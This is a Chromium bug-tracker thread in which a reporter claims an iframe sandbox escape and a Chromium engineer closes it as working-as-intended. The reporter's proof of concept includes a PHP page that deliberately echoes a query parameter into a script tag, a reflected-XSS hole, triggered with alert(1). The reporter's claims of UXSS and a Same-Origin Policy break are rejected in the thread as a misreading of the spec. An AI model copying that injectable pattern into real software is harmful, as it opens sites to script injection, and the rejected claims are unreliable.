@@ -1,0 +1,174 @@
+Issue ID: 441134586
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<h3>1. <code>a.html or index.html</code></h3>
+<pre><code>&lt;<span class="stx-keyword">iframe</span> sandbox=<span class="stx-string">&quot;allow-popups allow-same-origin allow-scripts allow-modals&quot;</span> src=<span class="stx-string">&quot;sandbox.html&quot;</span>&gt;&lt;/<span class="stx-keyword">iframe</span>&gt;
+</code></pre>
+<h3>2. <code>sandbox.html</code></h3>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span>&gt;
+  &lt;<span class="stx-keyword">body</span>&gt;
+    &lt;<span class="stx-keyword">iframe</span> name=<span class="stx-string">&quot;b&quot;</span>&gt;&lt;/<span class="stx-keyword">iframe</span>&gt;
+    &lt;<span class="stx-keyword">script</span>&gt;
+      b.open(<span class="stx-string">&#39;http://localhost:8000/xss.php?js=alert(1)&#39;</span>);
+    &lt;/<span class="stx-keyword">script</span>&gt;
+  &lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<h3>3. <code>xss.php</code></h3>
+<pre><code>&lt;?php
+$js = $_GET[&#39;js&#39;] ?? &#39;&#39;;
+header(&#39;Content-Type: text/html&#39;);
+?&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+  &lt;body&gt;
+    &lt;script&gt;
+      &lt;?= $js ?&gt;
+    &lt;/script&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h3>4. Start Local Server</h3>
+<pre><code>php -S localhost:8000
+</code></pre>
+<h3>5. Navigate to:</h3>
+<pre><code>http://localhost:8000/a.html
+</code></pre>
+<p>Allow the popup when prompted.</p>
+<h3>6. Result:</h3>
+<p>A new tab opens and <strong><code>alert(1)</code> executes</strong>, showing a <strong>sandbox escape</strong>.</p>
+<h2>Recommendations:</h2>
+<ul>
+<li>Enforce strict sandbox policy compliance in all Chromium versions.</li>
+<li>Ensure popups opened by sandboxed iframes inherit their sandbox unless <code>allow-popups-to-escape-sandbox</code> is set.</li>
+<li>Prevent popups from bypassing global popup-block settings via programmatic iframe navigation.</li>
+</ul>
+<h1>Problem Description</h1>
+<ul>
+<li>
+<p>Chrome incorrectly allows <strong>sandboxed iframes</strong> using the <code>sandbox</code> attribute (without <code>allow-popups-to-escape-sandbox</code>) to spawn <strong>unsandboxed popups</strong> that can execute <strong>arbitrary JavaScript</strong>, <strong>bypassing</strong> expected security restrictions and <strong>user settings</strong>.</p>
+</li>
+<li>
+<p>This behavior violates the <a href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox" data-b-widget="url" data-b-original-href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox" data-b-redirected-href="https://www.google.com/url?q=https://html.spec.whatwg.org/multipage/iframe-embed-object.html%23attr-iframe-sandbox&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2cW3BQuF8IybjtojhpdQaA">HTML specification for sandboxed iframes</a>, and undermines Chrome’s built-in protections related to iframe isolation, cross-origin restrictions, and popup control.</p>
+</li>
+</ul>
+<h3>Affected Products:</h3>
+<ul>
+<li><strong>Google Chrome Stable</strong> – Version: <code>139.0.7258.139</code></li>
+<li><strong>Google Chrome Canary</strong> – Version: <code>141.0.7375.3</code></li>
+<li><strong>Platform</strong>: macOS Sequoia 15.6.1</li>
+</ul>
+<h2>Impact:</h2>
+<p>An attacker can:</p>
+<ul>
+<li><strong>Escape iframe sandboxing</strong>.</li>
+<li><strong>Execute arbitrary JavaScript in a new tab/window</strong>.</li>
+<li><strong>Bypass popup blocking mechanisms</strong>.</li>
+<li><strong>Launch phishing, clickjacking, or XSS attacks</strong>.</li>
+<li>Exploit <strong>cross-origin sandboxed content</strong> to escalate privileges.</li>
+</ul>
+<h2>Proof of Cocnept:</h2>
+<ul>
+<li>I have uploaded the proof of concept video in this report for your review and reference.</li>
+</ul>
+<h1>Additional Comments</h1>
+<p>Manojkumar Jaganathan (<a href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-widget="url" data-b-original-href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-redirected-href="https://www.google.com/url?q=https://www.linkedin.com/in/manojkumar-j-7ba35b202/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3yGYjbAkUBzQSSXE1f3oDi">https://www.linkedin.com/in/manojkumar-j-7ba35b202/</a>) Aka TheWhiteEvil (<a href="https://hackerone.com/the-white-evil" data-b-widget="url" data-b-original-href="https://hackerone.com/the-white-evil" data-b-redirected-href="https://www.google.com/url?q=https://hackerone.com/the-white-evil&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2KREOzR1YCNOgjcFd19Ov8">https://hackerone.com/the-white-evil</a>) with HackerBro Technologies</p>
+<h1>Summary</h1>
+<p>Sandbox Escape &amp; Permission Bypass via <code>iframe</code> with Misapplied <code>sandbox</code> Restrictions</p>
+<h1>Custom Questions</h1>
+<h4>Reporter credit:</h4>
+<p>Manojkumar Jaganathan (TheWhiteEvil <a href="https://hackerone.com/the-white-evil" data-b-widget="url" data-b-original-href="https://hackerone.com/the-white-evil" data-b-redirected-href="https://www.google.com/url?q=https://hackerone.com/the-white-evil&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2KREOzR1YCNOgjcFd19Ov8">https://hackerone.com/the-white-evil</a>) <a href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-widget="url" data-b-original-href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-redirected-href="https://www.google.com/url?q=https://www.linkedin.com/in/manojkumar-j-7ba35b202/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3yGYjbAkUBzQSSXE1f3oDi">https://www.linkedin.com/in/manojkumar-j-7ba35b202/</a>  with HackerBro Technologies</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Stable <br>
+Regression: Yes \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: bu...@gmail.com
+Sandbox Escape & Permission Bypass via `iframe` with Misapplied `sandbox` Restrictions
+
+Author: bu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: bu...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: bu...@gmail.com
+<p>Hi team,</p>
+<p>I’ve tested the issue on a live server and can confirm that it is reproducible — the JavaScript executes successfully, demonstrating the sandbox escape.
+You can verify this by visiting the following URL in the browser:</p>
+<p>👉 <a href="https://attacker.hackerbro.net/a.html" data-b-widget="url" data-b-original-href="https://attacker.hackerbro.net/a.html" data-b-redirected-href="https://www.google.com/url?q=https://attacker.hackerbro.net/a.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3LVzUO4yjoi8cqCLqwyVbk">https://attacker.hackerbro.net/a.html</a></p>
+
+Author: bu...@gmail.com
+<p>Uploading POC video for reference and review. This issue results in both a UXSS (Universal Cross-Site Scripting) and a sandbox escape. Specifically, a sandboxed, cross-origin iframe is able to open a popup that executes arbitrary JavaScript in a new tab — without requiring allow-popups-to-escape-sandbox. This breaks the Same-Origin Policy (SOP) and violates the expected behavior of the sandbox attribute as defined by the HTML specification, effectively allowing untrusted content to escape the web content sandbox and execute unrestricted code.</p>
+
+Author: bu...@gmail.com
+TkRReE1UTTBOVGcyTFRZNE56VTBORFl5TFRrNU1qWTJNRFUwTlE9PQ==
+
+Author: ct...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: ct...@chromium.org
+public_non_google
+
+Author: ct...@chromium.org
+<p>Thanks for your report. In your POC, you include both <code>allow-same-origin</code> and <code>allow-scripts</code> in the sandbox attribute, which <em>as flagged in the spec</em> effectively just turns off sandboxing (see <a href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox:~:text=Setting%20both%20the%20allow%2Dscripts%20and%20allow%2Dsame%2Dorigin%20keywords%20together%20when%20the%20embedded%20page%20has%20the%20same%20origin%20as%20the%20page%20containing%20the%20iframe%20allows%20the%20embedded%20page%20to%20simply%20remove%20the%20sandbox%20attribute%20and%20then%20reload%20itself%2C%20effectively%20breaking%20out%20of%20the%20sandbox%20altogether." data-b-widget="url" data-b-original-href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox:~:text=Setting%20both%20the%20allow%2Dscripts%20and%20allow%2Dsame%2Dorigin%20keywords%20together%20when%20the%20embedded%20page%20has%20the%20same%20origin%20as%20the%20page%20containing%20the%20iframe%20allows%20the%20embedded%20page%20to%20simply%20remove%20the%20sandbox%20attribute%20and%20then%20reload%20itself%2C%20effectively%20breaking%20out%20of%20the%20sandbox%20altogether." data-b-redirected-href="https://www.google.com/url?q=https://html.spec.whatwg.org/multipage/iframe-embed-object.html%23attr-iframe-sandbox:~:text%3DSetting%2520both%2520the%2520allow%252Dscripts%2520and%2520allow%252Dsame%252Dorigin%2520keywords%2520together%2520when%2520the%2520embedded%2520page%2520has%2520the%2520same%2520origin%2520as%2520the%2520page%2520containing%2520the%2520iframe%2520allows%2520the%2520embedded%2520page%2520to%2520simply%2520remove%2520the%2520sandbox%2520attribute%2520and%2520then%2520reload%2520itself%252C%2520effectively%2520breaking%2520out%2520of%2520the%2520sandbox%2520altogether.&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3GN0e9tYURpbBGMyEraLf-">1</a>). Closing this as working-as-intended.</p>
+
+Author: ct...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: bu...@gmail.com
+<p><strong>Hi team,</strong></p>
+<p>I’ve observed that JavaScript is executing in Chrome Canary and Chrome Beta on Android <strong>without using <code>allow-modals</code></strong>, simply by using the following sandbox attributes:</p>
+<pre><code>sandbox=&quot;allow-popups allow-same-origin allow-scripts&quot;
+</code></pre>
+<p>I’ve attached a proof-of-concept video for your review and reference.</p>
+<p>Could you please check this behavior on your end and confirm whether the vulnerability exists?</p>
+<p><a href="https://attacker.hackerbro.net/a.html" data-b-widget="url" data-b-original-href="https://attacker.hackerbro.net/a.html" data-b-redirected-href="https://www.google.com/url?q=https://attacker.hackerbro.net/a.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3LVzUO4yjoi8cqCLqwyVbk">https://attacker.hackerbro.net/a.html</a></p>
+<p>Reference Reports:</p>
+<p><a href="https://issues.chromium.org/issues/40069622" data-b-widget="issue-reference" data-b-issue-id="40069622">https://issues.chromium.org/issues/40069622</a></p>
+<p><a href="https://issues.chromium.org/issues/40057525" data-b-widget="issue-reference" data-b-issue-id="40057525">https://issues.chromium.org/issues/40057525</a></p>
+<p>Thank you!</p>
+
+Author: bu...@gmail.com
+TkRReE1UTTBOVGcyTFRZNE9EQXdOVGs0TFRFMU56STVPVEkxT1E9PQ==
+
+Author: bu...@gmail.com
+TkRReE1UTTBOVGcyTFRZNE56ZzNORGc1TFMweE56STNOVFEzTkRjPQ==
+
+Author: bu...@gmail.com
+<p>Without allow-modals Firefox and Chrome doesn&#39;t execute JS. But it happens in chrome beta, chrome canary on android.</p>
+
+Author: bu...@gmail.com
+Wed Aug 27 2025 17:39:41 GMT+0530 (India Standard Time).png
+
+Author: bu...@gmail.com
+<p>This proof-of-concept video demonstrates that Chrome and Firefox do not escape the sandbox or execute JavaScript without adding the <code>allow-modals</code> and <code>allow-popups-to-escape-sandbox</code> permission.</p>
+
+Author: bu...@gmail.com
+TkRReE1UTTBOVGcyTFRZNE56ZzNORGt3TFMwNE1EQXdNVFV6TURRPQ==
+
+Author: bu...@gmail.com
+<p>Hi Team, have you had a time to review this comments and the poc on android?</p>
+
+Author: ct...@chromium.org
+<p>Re: #7 -- that is simply a limitation of your POC not working cross-browser, not a security issue. The spec clearly states how an iframe can use just those two sandbox attributes to completely bypass iframe sandboxing.</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
